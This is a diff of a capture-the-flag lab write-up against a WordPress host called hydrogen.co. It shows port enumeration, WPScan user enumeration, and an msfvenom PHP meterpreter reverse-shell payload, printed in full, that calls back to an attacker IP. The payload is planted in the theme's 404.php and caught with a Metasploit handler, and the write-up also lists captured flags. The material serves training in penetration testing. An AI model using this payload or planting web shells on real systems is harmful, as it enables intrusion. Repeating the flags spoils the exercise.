@@ -51,7 +51,7 @@ Give me a sum of running services on hydrogencorp.
 
 __ANSWER__
 
-`3`
+_3_
 
 __PROBLEM__
 
@@ -63,7 +63,7 @@ Give me the application version number. (e.g 1.2.6)
 
 __ANSWER__
 
-`1.2.6`
+_1.2.6_
 
 __PROBLEM__
 
@@ -75,7 +75,7 @@ Give me the software name running on port 80 on this host. (e.g. IIS)
 
 __ANSWER__
 
-`nginx 1.2.1`
+_nginx 1.2.1_
 
 __PROBLEM__
 
@@ -87,7 +87,7 @@ Give me the software and version running on port 22. (e.g. ProFTPD and 1.4.5
 
 __ANSWER__
 
-`OpenSSH and 6.0p1`
+_OpenSSH and 6.0p1_
 
 __PROBLEM__
 
@@ -102,7 +102,7 @@ __ANSWER__
 As we can see at the ftp service, we can see the flag1.txt..
 went to the `ftp://192.168.0.10` through browser and we can get the content of it
 
-flag{a173c6cb236d6fe768ad94a6df400874}
+_flag{a173c6cb236d6fe768ad94a6df400874}_
 
 __PROBLEM__
 
@@ -137,21 +137,21 @@ Alice
 alice@ymail.com
 ```
 
-hydrogen.co
+_hydrogen.co_
 
 __Cont..__
 
-We got the domain and the ip, so we map the ip address 192.168.0.10 with hydrogen.co.
+got the domain and the ip, so map the ip address 192.168.0.10 with hydrogen.co at `/etc/hosts`
 
-open hydrogen.co in the browser and we can get the page.. scrolling the source code and we get following snippet
+open hydrogen.co in the browser and get the page.. scrolling the source code and get following snippet
 
 `<!-- <a class="nav-link" href="/wordpress/">Blog</a> -->`
 
-go to the link `hydrogen.co/wordpress` and we can get the login page.
+go to the link `hydrogen.co/wordpress` and get the login page.
 
-so the next tool we used is WPSCAN for the website with the following code..
+so the next tool is WPSCAN for the website with the following code..
 
-`wpscan --url hydrogen.co/wordpress --enumerate u` and we got the user john 
+`wpscan --url hydrogen.co/wordpress --enumerate u` and got the user john 
 
 ```
 [+] Enumerating Users (via Passive and Aggressive Methods)
@@ -184,19 +184,19 @@ Progress Time: 00:00:03 <                                                       
 [+] Finished: Fri Mar 15 04:20:18 2019
 ```
 
-login to the wordpress.. I create a payload to get into shell of the ip with this code 
+login to the wordpress.. create a payload to get into shell of the ip with this code 
 
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=my ip :P LPORT=4444 -f raw`
 
-and we got the payload
+and got the payload
 
 ```
 /*<?php /**/ error_reporting(0); $ip = '192.168.0.104'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-paste the payload on wordpress theme 404.php, we've setup the payload.
+setup the payload by paste the payload on wordpress theme 404.php 
 
-we listen to the payload through metasploit with this code 
+listen to the payload through metasploit with this code 
 
 ```
 use exploit/multi/handler
@@ -206,9 +206,9 @@ set LPORT 4444
 exploit
 ```
 
-go to the browser link at `http://hydrogen.co/wordpress/wp-content/themes/twentythirteen/404.php` and we got the shell..
+go to the browser link at `http://hydrogen.co/wordpress/wp-content/themes/twentythirteen/404.php` and got the shell..
 
-use `cd /` then `find -name "*.txt"` we got the other flag directory 
+use `cd /` then `find -name "*.txt"` got the other flag directory 
 
 ```
 ./root/flag4.txt
@@ -216,7 +216,7 @@ use `cd /` then `find -name "*.txt"` we got the other flag directory
 ./usr/share/nginx/www/wordpress/flag2.txt
 ```
 
-and i also found `./usr/share/nginx/www/robots.txt` which is interesting ofcourse..
+found `./usr/share/nginx/www/robots.txt` which is interesting ofcourse..
 
 __PROBLEM__
 
@@ -230,7 +230,7 @@ __ANSWER__
 
 go into the flag2.txt dir and we got the flag2..
 
-flag{db6029f93797df27262460156bfbe0b9}
+_flag{db6029f93797df27262460156bfbe0b9}_
 
 __PROBLEM__
 
@@ -261,7 +261,7 @@ __ANSWER__
 
 went to the `hydrogen.co/robots.txt` gave us `disallow:/phpmyadmin` hence go the link `hydrogen.co/phpmyadmin`, login with same user and password.. we can get into the database.. search database for something useful and we found the flag5..
 
-flag{a260af638f07d39c838810eda005ceb3}
+_flag{a260af638f07d39c838810eda005ceb3}_
 
 
 
